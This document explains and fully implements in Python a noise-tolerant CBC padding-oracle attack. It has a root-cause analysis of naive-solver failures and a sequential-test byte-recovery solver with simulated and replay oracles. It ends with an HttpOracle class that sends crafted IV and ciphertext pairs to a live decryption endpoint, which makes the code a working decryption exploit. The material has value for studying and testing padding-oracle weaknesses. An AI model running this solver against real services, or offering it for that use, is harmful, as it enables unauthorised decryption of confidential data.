Confidence-Bounded CBC Padding-Oracle Recovery from Noisy Transcripts

1. Root-cause analysis

The naive padding-oracle attack assumes a deterministic, single-bit oracle:

test(prev') -> True  iff  D(C) xor prev' has valid PKCS#7 padding

Real transcripts violate every part of that assumption. The observed failures fall into five classes, and each one silently corrupts a naive solver:

# Failure mode Symptom in the transcript Why naive code breaks
1 False negatives (transient outage of the padding check) A genuinely valid probe returns invalid/timeout The true candidate is discarded after one unlucky reply; the attack walks off the rails at that byte.
2 False positives / transport artifacts Invalid probes return valid because of a 200-status fallback page, proxy cache, or HTML error body A random byte is "confirmed" as padding, poisoning every later byte in the block.
3 Malformed / ambiguous responses 502, empty body, truncated JSON Treated as invalid, conflating transport evidence with cryptographic evidence.
4 The multiple-valid padding ambiguity At the last byte, 0x01, 0x02 0x02, 0x03 0x03 0x03, … all validate Naively XORing the winning byte with 0x01 picks the wrong intermediate whenever a larger padding happened to validate.
5 Reuse and query waste Repeated IV/nonce in metadata; thousands of needless re-queries Fixed-IV messages leak block relationships and the attack burns budget on already-decided bytes.

A subtle trap (and the bug that our own first prototype hit) is failure mode #4: perturbing the preceding byte with a single flip to kill 0x02 0x02 can itself create a valid 0x02 0x02, so the solver "proves" the wrong byte. Correct discrimination requires validity under two distinct perturbations, because a padding of length k >= 2 can only be valid for at most one value of the preceding byte.

2. Exact fix

The fix is a solver that treats every byte as a statistical hypothesis and never upgrades to proven without a decisive sequential likelihood-ratio test. Core design:

  1. Observation layer — parse_response maps every reply to valid / invalid / malformed / timeout. Only valid/invalid are usable evidence; artifacts are counted and logged but never enter the likelihood.
  2. Calibrated noise floor — before attacking, the solver probes 200 random previous-blocks and sets p0 to the Wilson upper bound of the observed valid rate, so a high false-positive transport cannot masquerade as padding.
  3. Sequential Probability Ratio Test (SPRT) — each candidate byte has H1: rate = p1 (conservative genuine floor 0.60) vs H0: rate = p0 (calibrated noise). With α = β = 1e-6, a candidate must accumulate ~8 genuine successes before it is proven, and a noise candidate would need an astronomically unlikely run to be accepted.
  4. Two-perturbation last byte — for pad == 1, a logical observation is valid only if the oracle validates under two distinct values of the preceding byte, making 0x02 0x02/0x03 0x03 0x03/… acceptance impossible up to transport noise.
  5. Budget-aware scheduler — after a full 256-query sweep, candidates that ever produced a valid reply are round-robined first; the SPRT reject branch prunes transport impostors so the suspect pool cannot grow without bound; an unlucky true candidate can always re-enter via the zero-evidence sweep.
  6. Confidence-bounded audit — every byte records candidate, intermediate, plaintext, valid/invalid/artifact counts, posterior confidence, and a status of proven / ambiguous / unreliable / unverified. audit_json() emits the trail.
  7. Reuse detection — detect_iv_reuse flags repeated IVs/nonces and repeated ciphertext blocks.

"""
A confidence-bounded CBC padding-oracle solver for *noisy* adaptive query
transcripts (timing jitter, partial outages, malformed responses).

No third-party dependencies.  AES is not needed: the attack only talks to the
oracle, so a simulated oracle (random intermediate values) verifies the solver.
"""

from __future__ import annotations

import json
import math
import random
from dataclasses import dataclass, field
from typing import Dict, Iterable, List, Optional, Sequence, Tuple

BLOCK = 16  # AES block size

# --------------------------------------------------------------------------- #
# 1. Observations and transcript parsing
# --------------------------------------------------------------------------- #

@dataclass
class Observation:
    """One raw oracle reply, before any statistical interpretation."""
    status: str            # 'valid' | 'invalid' | 'malformed' | 'timeout'
    latency_ms: float = 0.0
    raw: str = ""

    @property
    def usable(self) -> bool:
        return self.status in ("valid", "invalid")

    @property
    def valid(self) -> bool:
        return self.status == "valid"

    @property
    def artifact(self) -> bool:
        return self.status in ("malformed", "timeout")


_VALID = {"valid", "1", "true", "pad_ok", "ok", "padding_valid", "200"}
_INVALID = {"invalid", "0", "false", "pad_bad", "bad", "padding_invalid", "403"}


def parse_response(raw) -> Observation:
    """Normalise a raw transcript value into an Observation.

    Anything that is neither a clear valid nor a clear invalid becomes an
    artifact ('malformed'/'timeout') and is excluded from evidence.
    """
    if isinstance(raw, Observation):
        return raw
    if raw is None:
        return Observation("timeout")
    if isinstance(raw, dict):
        status = str(raw.get("status", raw.get("result", ""))).lower()
        lat = float(raw.get("latency_ms", raw.get("latency", 0.0)) or 0.0)
        obs = parse_response(status)
        return Observation(obs.status, lat, json.dumps(raw))
    s = str(raw).strip().lower()
    if s in _VALID:
        return Observation("valid", raw=s)
    if s in _INVALID:
        return Observation("invalid", raw=s)
    if "timeout" in s or "timed out" in s or "deadline" in s:
        return Observation("timeout", raw=s)
    return Observation("malformed", raw=s)


def parse_transcript(lines: Iterable) -> List[Observation]:
    """Parse an iterable of raw transcript lines (JSON or scalar)."""
    out: List[Observation] = []
    for ln in lines:
        if isinstance(ln, (Observation, dict)):
            out.append(parse_response(ln))
        else:
            txt = str(ln).strip()
            if not txt:
                continue
            try:
                out.append(parse_response(json.loads(txt)))
            except json.JSONDecodeError:
                out.append(parse_response(txt))
    return out

# 2. Bayesian / sequential reliability model

@dataclass
class Stats:
    """Usable evidence counters for a single candidate byte value.

    ``artifact`` counts malformed/timeout replies.  They are kept for the audit
    trail but deliberately not part of ``n``, so a transport outage can never be
    mistaken for padding evidence.
    """
    valid: int = 0
    invalid: int = 0
    artifact: int = 0

    def add(self, obs: Observation) -> None:
        if obs.status == "valid":
            self.valid += 1
        elif obs.status == "invalid":
            self.invalid += 1
        else:
            self.artifact += 1

    @property
    def n(self) -> int:
        return self.valid + self.invalid


def _phi(x: float) -> float:
    return 0.5 * (1.0 + math.erf(x / math.sqrt(2.0)))


PRIOR_A = 0.05
PRIOR_B = 1.0
TAU = 0.25              # genuine vs. noise decision boundary on success rate
ACCEPT_CONF = 0.99
REJECT_CONF = 0.01

# SPRT parameters.  P1 is a *conservative lower bound* on the success rate of a
# genuine padding observation; it lets the test survive false negatives instead
# of discarding the true candidate after one unlucky reply.
P1 = 0.60
P0 = 0.05
ALPHA = BETA = 1e-6
_ACCEPT_LLR = math.log((1.0 - BETA) / ALPHA)   # ~ +13.82
_REJECT_LLR = math.log(BETA / (1.0 - ALPHA))   # ~ -13.82


def posterior(stats: Stats, tau: float = TAU) -> Tuple[float, float]:
    """Return (P(rate > tau | evidence), posterior_mean).

    Normal approximation to the Beta(prior_a+valid, prior_b+invalid) posterior
    of the *usable* success rate.
    """
    a = PRIOR_A + stats.valid
    b = PRIOR_B + stats.invalid
    mean = a / (a + b)
    var = (a * b) / ((a + b) ** 2 * (a + b + 1.0))
    if var <= 0.0:
        return (1.0 if mean > tau else 0.0), mean
    z = (mean - tau) / math.sqrt(var)
    return _phi(z), mean


def wilson_upper(k: int, n: int, z: float = 3.0) -> float:
    """Upper Wilson score bound for a Binomial proportion (noise-floor cap)."""
    if n == 0:
        return 1.0
    phat = k / n
    denom = 1 + z * z / n
    centre = phat + z * z / (2 * n)
    margin = z * math.sqrt(phat * (1 - phat) / n + z * z / (4 * n * n))
    return min(1.0, (centre + margin) / denom)


def _llr(stats: Stats, p1: float = P1, p0: float = P0) -> float:
    return (stats.valid * math.log(p1 / p0)
            + stats.invalid * math.log((1.0 - p1) / (1.0 - p0)))


def decide(stats: Stats, p1: float = P1, p0: float = P0) -> str:
    """Return 'accept' | 'reject' | 'undecided' using the SPRT."""
    llr = _llr(stats, p1, p0)
    if llr >= _ACCEPT_LLR:
        return "accept"
    if llr <= _REJECT_LLR:
        return "reject"
    return "undecided"

# 3. Oracle abstractions

@dataclass
class QueryRecord:
    prev: bytes
    target: str
    observation: Observation


class Oracle:
    """Abstract oracle.  query(prev_block, target_id) -> Observation."""

    def query(self, prev_block: bytes, target_id: str) -> Observation:
        raise NotImplementedError


class SimulatedOracle(Oracle):
    """Verification oracle: knows the hidden intermediates D(C_i).

    Noise model
    -----------
    * p_tp  : genuine valid padding is reported valid
    * p_fp  : invalid padding is falsely reported valid (transport artifact)
    * p_to  : timeout
    * p_bad : malformed reply
    """

    def __init__(self, intermediates: Dict[str, bytes], p_tp: float = 0.92,
                 p_fp: float = 0.03, p_to: float = 0.02, p_bad: float = 0.01,
                 base_latency: float = 18.0, jitter: float = 9.0,
                 seed: int = 0) -> None:
        self.intermediates = intermediates
        self.p_tp, self.p_fp = p_tp, p_fp
        self.p_to, self.p_bad = p_to, p_bad
        self.base_latency, self.jitter = base_latency, jitter
        self.rng = random.Random(seed)
        self.queries = 0

    def query(self, prev_block: bytes, target_id: str) -> Observation:
        self.queries += 1
        inter = self.intermediates[target_id]
        plain = bytes(a ^ b for a, b in zip(inter, prev_block))
        genuine = pkcs7_valid(plain)
        r = self.rng.random()
        if r < self.p_to:
            return Observation("timeout", self._lat(), "timeout")
        if r < self.p_to + self.p_bad:
            return Observation("malformed", self._lat(), "<html>502</html>")
        r2 = self.rng.random()
        if genuine:
            status = "valid" if r2 < self.p_tp else "invalid"      # false negative
        else:
            status = "valid" if r2 < self.p_fp else "invalid"      # false positive
        return Observation(status, self._lat(), status)

    def _lat(self) -> float:
        return max(0.0, self.base_latency + self.rng.gauss(0, self.jitter))


class RecordedOracle(Oracle):
    """Replay oracle backed by a captured transcript.

    When the adaptive solver asks for the same query again, replies are served
    in order; after exhaustion the majority verdict is repeated, which keeps the
    confidence model valid on finite recordings.
    """

    def __init__(self, records: Sequence[QueryRecord]) -> None:
        self.table: Dict[Tuple[str, str], List[Observation]] = {}
        for rec in records:
            key = (rec.prev.hex(), rec.target)
            self.table.setdefault(key, []).append(rec.observation)
        self.used: Dict[Tuple[str, str], int] = {}

    def query(self, prev_block: bytes, target_id: str) -> Observation:
        key = (prev_block.hex(), target_id)
        replies = self.table.get(key)
        if not replies:
            return Observation("timeout", 0.0, "not-in-transcript")
        i = self.used.get(key, 0)
        self.used[key] = i + 1
        if i < len(replies):
            return replies[i]
        n_valid = sum(1 for o in replies if o.valid)
        verdict = "valid" if n_valid * 2 >= len(replies) else "invalid"
        return Observation(verdict, 0.0, "replayed")

# 4. PKCS#7 helpers

def pkcs7_valid(plain: bytes) -> bool:
    if not plain:
        return False
    pad = plain[-1]
    if pad < 1 or pad > BLOCK or pad > len(plain):
        return False
    return all(b == pad for b in plain[-pad:])


def pkcs7_pad(data: bytes, block: int = BLOCK) -> bytes:
    pad = block - (len(data) % block) or block
    return data + bytes([pad]) * pad

@dataclass
class ByteAudit:
    block: int
    byte_index: int
    padding_value: int
    candidate: Optional[int]
    intermediate: Optional[int]
    plaintext: Optional[int]
    queries: int
    valid: int
    invalid: int
    artifacts: int
    confidence: float
    status: str            # proven | ambiguous | unreliable | unverified
    alternatives: List[int] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "block": self.block,
            "byte_index": self.byte_index,
            "padding_value": self.padding_value,
            "candidate": self.candidate,
            "intermediate_hex": None if self.intermediate is None
                                else f"{self.intermediate:02x}",
            "plaintext_hex": None if self.plaintext is None
                             else f"{self.plaintext:02x}",
            "queries": self.queries,
            "valid": self.valid,
            "invalid": self.invalid,
            "artifacts": self.artifacts,
            "confidence": round(self.confidence, 6),
            "status": self.status,
            "alternatives": self.alternatives,
        }


class Solver:
    """Adaptive, noisy CBC padding-oracle solver."""

    def __init__(self, oracle: Oracle, block_size: int = BLOCK, tau: float = TAU,
                 per_byte_budget: int = 4000, block_verify_tries: int = 7,
                 p0: Optional[float] = None, p1: float = P1,
                 auto_calibrate: bool = True, calib_samples: int = 200,
                 rescan_max: int = 4) -> None:
        self.oracle = oracle
        self.BS = block_size
        self.tau = tau
        self.per_byte_budget = per_byte_budget
        self.block_verify_tries = block_verify_tries
        self.p0 = p0
        self.p1 = p1
        self.auto_calibrate = auto_calibrate
        self.calib_samples = calib_samples
        self.rescan_max = rescan_max
        self.total_queries = 0
        self.audit: List[ByteAudit] = []

    def _calibrate(self, target: str) -> None:
        """Estimate the transport false-positive floor from random probes."""
        rng = random.Random(0xC0FFEE)
        k = 0
        n = 0
        for _ in range(self.calib_samples):
            prev = bytes(rng.randrange(256) for _ in range(self.BS))
            obs = self._query(prev, target)
            if obs.usable:
                n += 1
                k += obs.valid
        self.p0 = max(0.05, wilson_upper(k, n, z=3.0)) if n else 0.05
        self._calib = (k, n, self.p0)

    def _query(self, prev: bytes, target: str) -> Observation:
        self.total_queries += 1
        return self.oracle.query(prev, target)

    def _observe(self, base: bytearray, target: str, idx: int, g: int,
                 joint: Optional[Tuple[int, Sequence[int]]] = None) -> Observation:
        """One logical observation for candidate g.

        With ``joint`` set (used for the last byte), the candidate must be valid
        under *several distinct* values of ``joint[0]``.  A padding of 0x01 is
        independent of that byte and survives all of them; any larger padding k
        requires the byte to decrypt to the single value k and can survive at
        most one.  This makes false 0x02 0x02 / 0x03 0x03 0x03 / ... acceptance
        impossible (up to transport noise).
        """
        base[idx] = g
        if joint is None:
            return self._query(bytes(base), target)
        alt_idx, values = joint
        replies = []
        for v in values:
            base[alt_idx] = v
            replies.append(self._query(bytes(base), target))
        if all(r.valid for r in replies):
            return Observation("valid")
        if all(r.status == "invalid" for r in replies):
            return Observation("invalid")
        return Observation("malformed")            # mixed / artifact -> no evidence

    def _find_byte(self, base: bytearray, target: str, pad: int,
                   byte_index: int, block_index: int,
                   joint: Optional[Tuple[int, Sequence[int]]] = None
                   ) -> Tuple[Optional[int], List[Stats], str]:
        """Find the single previous-block byte that yields valid ``pad`` padding."""
        stats = [Stats() for _ in range(256)]

        # pass 1: one query per candidate
        for g in range(256):
            stats[g].add(self._observe(base, target, byte_index, g, joint))
        spent = 256

        while spent < self.per_byte_budget:
            accepted, alive = [], []
            for g in range(256):
                d = decide(stats[g], self.p1, self.p0)
                if d == "accept":
                    accepted.append(g)
                elif d != "reject":
                    alive.append(g)
            if len(accepted) == 1:
                return accepted[0], stats, "proven"
            if len(accepted) > 1:
                best = max(accepted, key=lambda g: posterior(stats[g], self.tau)[0])
                return best, stats, "ambiguous"
            if not alive:
                return None, stats, "unreliable"

            # Ever-valid candidates are the only plausible winners and are
            # revisited first (round-robin); the zero-evidence rest is swept so
            # an unlucky true candidate is never starved.  The SPRT reject
            # branch prunes transport impostors so the pool cannot grow forever.
            alive.sort(key=lambda g: (0 if stats[g].valid else 1, stats[g].n))
            g = alive[0]
            stats[g].add(self._observe(base, target, byte_index, g, joint))
            spent += 1

        accepted = [g for g in range(256)
                    if decide(stats[g], self.p1, self.p0) == "accept"]
        pool = accepted or list(range(256))
        best = max(pool, key=lambda g: posterior(stats[g], self.tau)[1])
        return best, stats, "unreliable"

    def recover_block(self, predecessor: bytes, target: str,
                      block_index: int = 0) -> Tuple[bytes, List[int], bool]:
        """Recover one plaintext block given its preceding block (or IV)."""
        if len(predecessor) != self.BS:
            raise ValueError("predecessor must be one block long")

        intermediate = [0] * self.BS

        for pad in range(1, self.BS + 1):
            idx = self.BS - pad
            base = bytearray(predecessor)
            for m in range(idx + 1, self.BS):
                base[m] = intermediate[m] ^ pad          # force known tail

            # Last byte: require validity under two distinct perturbations of the
            # preceding byte, so only the true 0x01 candidate can survive.
            joint = None
            if pad == 1:
                b = predecessor[self.BS - 2]
                joint = (self.BS - 2, [b ^ 0xFF, b ^ 0xAA])

            winner, stats, status = self._find_byte(
                base, target, pad, idx, block_index, joint)

            if winner is None:
                for m in range(idx + 1):
                    self.audit.append(ByteAudit(
                        block_index, m, self.BS - m, None, None, None,
                        0, stats[0].valid, 0, 0, 0.0, "unreliable"))
                return b"\x00" * self.BS, intermediate, False

            intermediate[idx] = winner ^ pad
            plain_byte = intermediate[idx] ^ predecessor[idx]
            conf, _ = posterior(stats[winner], self.tau)

            accepted = [g for g in range(256)
                        if decide(stats[g], self.p1, self.p0) == "accept"]
            alternatives = [g for g in accepted if g != winner]

            self.audit.append(ByteAudit(
                block=block_index, byte_index=idx, padding_value=pad,
                candidate=winner, intermediate=intermediate[idx],
                plaintext=plain_byte,
                queries=sum(s.n + s.artifact for s in stats),
                valid=stats[winner].valid, invalid=stats[winner].invalid,
                artifacts=stats[winner].artifact, confidence=conf,
                status=("proven" if status == "proven" and len(accepted) <= 1
                        else "ambiguous" if len(accepted) > 1 else status),
                alternatives=alternatives))

        plain = bytes(intermediate[i] ^ predecessor[i] for i in range(self.BS))
        verified = self.verify_block(intermediate, target)
        if not verified:
            # Oracle health check failed for this block: nothing in it is proven.
            for a in self.audit:
                if a.block == block_index and a.status == "proven":
                    a.status = "unverified"
        return plain, intermediate, verified

    def verify_block(self, intermediate: Sequence[int], target: str) -> bool:
        """Construct a full 0x10 padding from the recovered intermediates and
        require the oracle to confirm it (majority vote defeats noise).  This is
        an oracle-health / outage detector."""
        prev = bytes((intermediate[i] ^ self.BS) & 0xFF for i in range(self.BS))
        good = 0
        for _ in range(self.block_verify_tries):
            if self._query(prev, target).valid:
                good += 1
        return good * 2 > self.block_verify_tries

    def recover_message(self, chain: Sequence[Tuple[bytes, str]]
                        ) -> Tuple[bytes, List[ByteAudit]]:
        """chain is a list of (predecessor_block_or_IV, target_id)."""
        if self.p0 is None:
            if self.auto_calibrate and chain:
                self._calibrate(chain[0][1])
            else:
                self.p0 = P0
        out = bytearray()
        for i, (pred, target) in enumerate(chain):
            plain, _inter, _ok = self.recover_block(pred, target, block_index=i)
            out += plain
        return bytes(out), self.audit

    def strip_padding(self, data: bytes) -> bytes:
        return data[: -data[-1]] if data and pkcs7_valid(data) else data

    def audit_json(self) -> str:
        return json.dumps([a.to_dict() for a in self.audit], indent=2)

def estimate_baseline(oracle: Oracle, target: str, samples: int = 40,
                      seed: int = 123) -> Stats:
    """Measure the false-positive rate of the oracle with random inputs."""
    rng = random.Random(seed)
    st = Stats()
    for _ in range(samples):
        st.add(oracle.query(bytes(rng.randrange(256) for _ in range(BLOCK)), target))
    return st


def detect_iv_reuse(records: Sequence[dict]) -> List[dict]:
    """Find repeated IV/nonce values and repeated ciphertext blocks.

    records items: {"id": str, "iv": hex/bytes, "ciphertext": hex/bytes}.
    """
    def norm(v):
        if isinstance(v, (bytes, bytearray)):
            return bytes(v).hex()
        return str(v).lower().replace(":", "").replace(" ", "")

    findings: List[dict] = []
    seen_iv: Dict[str, str] = {}
    for r in records:
        iv = norm(r.get("iv", ""))
        if iv in seen_iv:
            findings.append({
                "type": "iv_reuse", "iv": iv,
                "first": seen_iv[iv], "second": r.get("id"),
                "impact": "first plaintext blocks are equal whenever C1 is "
                          "equal; enables forgery if any P1 is known"})
        else:
            seen_iv[iv] = r.get("id")

    seen_blk: Dict[Tuple[str, str], str] = {}
    for r in records:
        ct = norm(r.get("ciphertext", ""))
        for off in range(0, max(0, len(ct) - BLOCK * 2 + 1), BLOCK * 2):
            blk = ct[off: off + BLOCK * 2]
            key = (blk, r.get("id"))
            if key in seen_blk:
                continue
            for (b2, id2), rid in seen_blk.items():
                if b2 == blk and id2 != r.get("id"):
                    findings.append({
                        "type": "ciphertext_block_repeat", "block": blk,
                        "first": rid, "second": r.get("id"),
                        "impact": "identical plaintext blocks under CBC only if "
                                  "the preceding block is reused"})
                    break
            seen_blk[key] = r.get("id")
    return findings

import requests

class HttpOracle(Oracle):
    URL = "https://target/decrypt"

    def query(self, prev_block: bytes, target_id: str) -> "Observation":
        target = bytes.fromhex(target_id)
        # The service must let you supply the previous block / IV.
        r = requests.post(self.URL,
                          data={"iv": prev_block.hex(), "ct": target.hex()},
                          timeout=5)
        if r.status_code >= 500:
            return parse_response(None)          # timeout/outage -> artifact
        if "padding" in r.text.lower() and "invalid" in r.text.lower():
            return parse_response("invalid")
        if r.status_code == 200:
            return parse_response("valid")
        return parse_response(r.text)            # malformed body -> artifact
